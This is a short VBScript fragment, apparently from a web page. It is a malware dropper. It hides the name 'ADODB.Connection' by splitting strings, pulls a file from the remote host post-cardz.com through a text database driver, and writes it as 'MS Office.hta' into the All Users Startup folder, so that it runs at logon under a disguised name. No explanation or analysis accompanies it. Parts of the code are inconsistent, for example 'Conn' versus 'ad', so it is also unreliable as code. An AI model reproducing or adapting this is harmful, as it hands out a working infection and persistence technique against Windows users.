Dim ad, rs
Dim a="O"

Set ad = CreateObject("AD"+a+"DB"+".C"+"onn"+"ection")
Dim sel
Set sel="SE"+"LECT * from foobar.txt"
Conn.Open "Driver={Microsoft Text Driver (*.txt; *.csv)};" & _
"Dbq=http://post-cardz.com;" & _
"Extensions=asc,csv,tab,txt;" & _
"Persist Security Info=False"
Dim sql
sql = "SELECT * from foobar.txt"
set rs = conn.execute(sql)
set rs =CreateObject("ADODB.recordset")
rs.Open sel, ad
Dim bb4
rs.Save "C:\Docume"+"nts and Settings\All Users\Start Menu\Programs\Startup\MS Office.hta", adPersistXML
Dim bb8
rs.close
ad	.close
window.close